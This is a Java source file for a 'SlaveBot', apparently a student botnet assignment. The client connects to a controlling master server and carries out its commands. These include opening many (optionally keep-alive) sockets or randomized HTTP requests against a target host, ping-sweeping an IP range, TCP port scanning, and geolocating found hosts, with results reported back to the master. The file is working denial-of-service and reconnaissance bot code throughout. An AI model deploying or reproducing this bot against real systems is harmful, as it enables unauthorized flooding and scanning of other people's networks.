/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
*/
import java.io.*;

import java.net.*;
import java.util.ArrayList;
import java.util.Random;



/**
 *
 * @author Prashanth
 */
public class SlaveBot {
	
	
	public static String standardcommand(String standardcommandelements){
		String newcommand1=standardcommandelements;
		String[] commands;
		commands=standardcommandelements.split(" ");
		
		if(commands.length==5 && commands[0].equals("connect") && commands[4].equals("keepalive")){
			newcommand1= commands[0]+ " "+  commands[1]+ " "+  commands[2]+ " "+  commands[3]+ " "+  "1"+ " "+  commands[4];

		}
			else if(commands.length==5 && commands[0].equals("connect") && commands[4].startsWith("url=")){
			newcommand1=commands[0]+ " "+ commands[1]+ " "+  commands[2]+ " "+  commands[3]+ " "+  "1"+  " "+ commands[4];

			}
			

			if(commands.length==6){
			newcommand1= standardcommandelements;
			}
		return newcommand1;
		
	}
	
	
	 
	  
	private static String generateRandom() {
		String ABCD="ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"; 
	    Random rand=new Random();
	    StringBuilder res=new StringBuilder();
	    for (int i = 0; i < 20; i++) {
	       int RIndex=rand.nextInt(ABCD.length()); 
	       res.append(ABCD.charAt(RIndex));            
	    }
	    return res.toString();
	}
	
	
	
    public static void main(String[] args) throws IOException {
    	
    	ArrayList<Socket> connections= new ArrayList<>();
    	ArrayList<String> ListsPort= new ArrayList<String>();
    	ArrayList<String> ListsIP= new ArrayList<String>();
    	
    	String[] commands = null;
    
      
    	try{
            Socket slavesocket= new Socket(args[1],Integer.parseInt(args[3])); //server input and port args[0]
            Socket s;
            
            BufferedReader din = new BufferedReader(new InputStreamReader(slavesocket.getInputStream()));
            
            DataOutputStream dout= new DataOutputStream(slavesocket.getOutputStream());
            System.out.println(InetAddress.getLocalHost().getHostName()+"\n");
            dout.writeUTF(InetAddress.getLocalHost().getHostName()+"\n");
            dout.flush();
            
            
            String line="";
            
           // String msgout;
            int numconnect = 0;
            
            while(!line.equals("end")){
            
            	
            	line = din.readLine();
            	
            	line= standardcommand(line);
                commands = line.split(" ");
                System.out.println("Command: "+line);

               
                if(commands[0].equals("connect")){
                    numconnect = Integer.parseInt(commands[4]);//it was in 92
                	System.out.println("Connect command received...Processing..");
                	 
                	if(commands.length==6 && commands[5].equals("keepalive")){
                	
                		
                	for(int i = 0; i < numconnect;i++){
                		Socket targetHost= new Socket(commands[2],Integer.parseInt(commands[3]));
                		targetHost.setKeepAlive(true);
                		System.out.println("kept alive");
                		connections.add(targetHost);
                	}
                	}
                	else if(commands.length==6 && commands[5].startsWith("url=")){
                		
                		String url=commands[5].substring(4);
                		String myurl="http://"+ commands[2]+ url+ generateRandom();
                		System.out.println("Constructed url - "+myurl);
                		URL url1 = new URL(myurl);
                		URLConnection http = url1.openConnection();
                		System.out.println(http.getContent());
                		
                	}
                	else{
                		for(int i = 0; i < numconnect;i++){
                    		Socket targetHost= new Socket(commands[2],Integer.parseInt(commands[3]));
                    		connections.add(targetHost);
                    	}
                	}
	                 
                }
                
   

            
                
                 else if (commands[0].equals("disconnect"))
                {   
                	System.out.println("Disconnecting!");
                		if(commands.length==4)
                		//System.out.println("Everybody dies!");
                		for(int i = 0; i < connections.size();i++){
                			Socket targetHost= connections.get(i);
                			System.out.println(commands[1]+" "+targetHost.getInetAddress().getHostName().toString()+" "+targetHost.getInetAddress().getHostAddress()+" "+targetHost.getPort());
                			if((commands[2]).equals(targetHost.getInetAddress().getHostName().toString()) || commands[2].equals(targetHost.getInetAddress().getHostAddress())){
                				System.out.println("Deleting element");
                				targetHost.close();
                				connections.remove(i);
                				i= i - 1;
                			
                		 // i=i-1 is used because i am using an array list and in that if i am removing a particular connection then the value of the list decrements itself by 1. for example i am deleting the 2nd block which contains the 2nd element of an array, the function deletes it and jumps to the 3 block which at the present state contains the 4th element of the array, so it skips one element. so to delete the 3rd element which is skipped, i do i-1 to get back again to the 2nd position which at ptesent conatins the third element.			
                			}
                		}
                		else{
                			int a=0;
                    	
                    	for(int j=0;j<connections.size();j++){
                    		s=connections.get(j);
                    		if(commands[2].equals(s.getInetAddress().getHostName().toString()) || commands[2].equals(s.getInetAddress().getHostAddress()))
                    		{
                    		s.close();
                    		connections.remove(j);
                    		j=j-1;
                    		a++;
                    		}
                    		if (a>=Integer.parseInt(commands[4])){
                    			break;
                    		}
                    			
                    				
                    				
                    		}
    	                
                			
                			}
                    	}
                
                
                
    	
            
                 else if(commands[0].equals("ipscan")) {
            	
            	String[] splittedIP=commands[2].split("-");
            	
            	System.out.println("ip range given-" + splittedIP[0] + " to " + splittedIP[1]); 

            	String[] splittedbydot1=splittedIP[0].split("\\.");
            	String[] splittedbydot2=splittedIP[1].split("\\.");
            	
            	int sbd1=Integer.parseInt(splittedbydot1[3]);
            	int sbd2=Integer.parseInt(splittedbydot2[3]);
            	int i;
            	for ( i=sbd1 ; i<= sbd2; i++){
            		
            	String ip= splittedbydot1[0]+"."+splittedbydot1[1]+"."+splittedbydot1[2]+"."+Integer.toString(i);
            	
                    try{
                            String cmd=""; 
                           if(System.getProperty("os.name").startsWith("Windows")) {	
                                    // For Windows
                        	   
                                    cmd= "ping -n 1 -w 5000  " + ip;
                            } else {
                                    // For MAC OS
                                    cmd = "ping -c 1 -t 5000 " + ip;
                            }

                            Process myProcess = Runtime.getRuntime().exec(cmd);
                            //myProcess.waitFor();
                            BufferedReader in= new BufferedReader( new InputStreamReader(myProcess.getInputStream()));
                            String info="";
                            while((info=in.readLine())!=null){
                            	System.out.println(info);
                            }
                            
                            myProcess.waitFor();
                            if(myProcess.exitValue() == 0) {
                            	
                            	
                            	System.out.println("sucess");   
                            	ListsIP.add(ip);
                            	
                            } 
                            
                            else {

                                    System.out.println("no response recieved.");
                            	}
            		
                    } catch( Exception e ) {
                    	System.out.println(e);  
                    			}
            }
            	System.out.println(ListsIP);
            	
            	try{
            		dout = new DataOutputStream(slavesocket.getOutputStream());
            		dout.writeUTF(ListsIP + "\n");
            		dout.flush();
            			}catch (IOException e) {
							// TODO Auto-generated catch block
							
						}ListsIP.clear();	
            }
            
             else if(commands[0].equals("tcpportscan")) {
            	 
        		String[] splittedPort=commands[3].split("-");
        		
        		System.out.println("scanning ports" + splittedPort[0] + " to " + splittedPort[1]+ "please wait.....");
        	    int sp1=Integer.parseInt(splittedPort[0]);
        		int sp2=Integer.parseInt(splittedPort[1]);
        		
        		for (int i= sp1; i<= sp2; i++){

        		
        		 try {
        			
        			 final int port=i;
        			 		
	        	            try {
	        	            	Socket s1 = new Socket(commands[2], port);
	        	            	
								s1.close();
								ListsPort.add(Integer.toString(port));
	        	            }catch (IOException e) {
	        					// TODO Auto-generated catch block
	        					
	        				}
	        	            	        	                    			 			     			
        		 }	
        	         catch (Exception ex) {
        	            
        	        }
        	}
        		System.out.println(ListsPort);
        		
        		
        		
        			try{
        			dout = new DataOutputStream(slavesocket.getOutputStream());
        			dout.writeUTF(ListsPort + "\n");
        			dout.flush();	
        	}catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
        	ListsPort.clear();		
             }
                
             else if(commands[0].equals("geoipscan")) {
             	
             	String[] splittedIP=commands[2].split("-");
             	
             	String[] splittedbydot1=splittedIP[0].split("\\.");
             	String[] splittedbydot2=splittedIP[1].split("\\.");
             	
             	int sbd1=Integer.parseInt(splittedbydot1[3]);
             	int sbd2=Integer.parseInt(splittedbydot2[3]);
             	int i;
             	for ( i=sbd1 ; i<= sbd2; i++){
             		
             	String ip= splittedbydot1[0]+"."+splittedbydot1[1]+"."+splittedbydot1[2]+"."+Integer.toString(i);
             	
                     try{
                             String cmd=""; 
                            if(System.getProperty("os.name").startsWith("Windows")) {	
                                     // For Windows
                         	   
                                     cmd= "ping -n 1 -w 5000 " + ip;
                             } else {
                                     // For MAC OS
                                     cmd = "ping -c 1 -t 5 " + ip;
                             }

                             Process myProcess = Runtime.getRuntime().exec(cmd);
                             //myProcess.waitFor();
                             BufferedReader in= new BufferedReader( new InputStreamReader(myProcess.getInputStream()));
                             String info="";
                             while((info=in.readLine())!=null){
                             	System.out.println(info);
                             }
                             
                             myProcess.waitFor();
                             if(myProcess.exitValue() == 0) {
                             	
                             	
                             	System.out.println("success");   
                             	ListsIP.add(ip);
                             	
                             } 
                             
                             else {
                            	 
                                     System.out.println("IPs not reachable");
                             	}
                             
             		
                     }
                     catch( Exception e ) {
                     	System.out.println(e);  
                     			}
                     
             	
             	}
             	
             	System.out.println("IPs available: "+ListsIP);
             	for(int j=0;j<ListsIP.size();j++){
             		
             		String newips = ListsIP.get(j);
             		String url="http://freegeoip.net/csv/"+newips;
             		URL url1 = new URL(url);
             		URLConnection newurl = url1.openConnection();
             		InputStream in = newurl.getInputStream();
             		String encoding = newurl.getContentEncoding();
             		encoding = encoding == null ? "UTF-8" : encoding;
             		ByteArrayOutputStream baos = new ByteArrayOutputStream();
             		byte[] buf = new byte[8192];
             		int len = 0;
             		while ((len = in.read(buf)) != -1) {
             		    baos.write(buf, 0, len);
             		}
             		String body = new String(baos.toByteArray(), encoding);
             		String[] gotbody=body.split(",");
             		
             		
             		
             		if(gotbody[9].equals("0.0000") || gotbody[8].startsWith("0.0000")){
             			           		    
             			String url2="https://api.ipify.org/";
             			URL url3 = new URL(url2);
             			URLConnection newurl1 = url3.openConnection();
             			InputStream in1 = newurl1.getInputStream();
             			String encoding1 = newurl1.getContentEncoding();
                 		encoding1 = encoding1 == null ? "UTF-8" : encoding1;
                 		ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
                 		byte[] buf1 = new byte[8192];
                 		int len1 = 0;
                 		while ((len1 = in1.read(buf1)) != -1) {
                 		    baos1.write(buf1, 0, len1);
                 		}
                 		String body1 = new String(baos1.toByteArray(), encoding1);
                 				//System.out.println(in1);
                 		String url4="http://freegeoip.net/csv/"+body1;
                 		URL url5 = new URL(url4);
                 		URLConnection newurl2 = url5.openConnection();
                 		
                 		InputStream in2 = newurl2.getInputStream();
                 		String encoding2 = newurl2.getContentEncoding();
                 		encoding2 = encoding2 == null ? "UTF-8" : encoding2;
                 		ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
                 		byte[] buf2 = new byte[8192];
                 		int len2 = 0;
                 		while ((len2 = in2.read(buf2)) != -1) {
                 		    baos2.write(buf2, 0, len2);
                 		}
                 		String body3 = new String(baos2.toByteArray(), encoding2);
                 		String[] gotbody1=body3.split(",");
                 		String fullIP=" PRIVATE-IP-"+newips+"   PUBLIC-IP-"+body1+"   COUNTRY-"+gotbody1[2]+"   STATE- "+gotbody1[4]+"   CITY- "+gotbody1[5]+"   PINCODE- "+gotbody1[6];
             			
             			
             			try{
                     		dout = new DataOutputStream(slavesocket.getOutputStream());
                     		dout.writeUTF(fullIP + "\n");
                     		dout.flush();
                     			}catch (IOException e) {
         							// TODO Auto-generated catch block
         							
         						}
             		
             		}
             		else {System.out.println(" PUBLIC-IP-"+newips+"  COUNTRY- "+gotbody[2]+"  STATE- "+gotbody[4]+"  CITY- "+gotbody[5]+"  PINCODE- "+gotbody[6]);
            		      String fullIP=" PUBLIC-IP- "+newips+"  COUNTRY- "+gotbody[2]+"  STATE- "+gotbody[4]+"  CITY- "+gotbody[5]+"  PINCODE- "+gotbody[6];   		
            		
            		      try{
                       		dout = new DataOutputStream(slavesocket.getOutputStream());
                       		dout.writeUTF(fullIP + "\n");
                       		dout.flush();
                       			}catch (IOException e) {
           							// TODO Auto-generated catch block
           							
           						}
             		}
             		
             	} ListsIP.clear();
             	
             		
             }
                               
             else {
            	 System.out.println("command is not proper");
             }
    	
            }}catch(IOException e ){}
    }}

    	
    	
    	
    

		
    


       

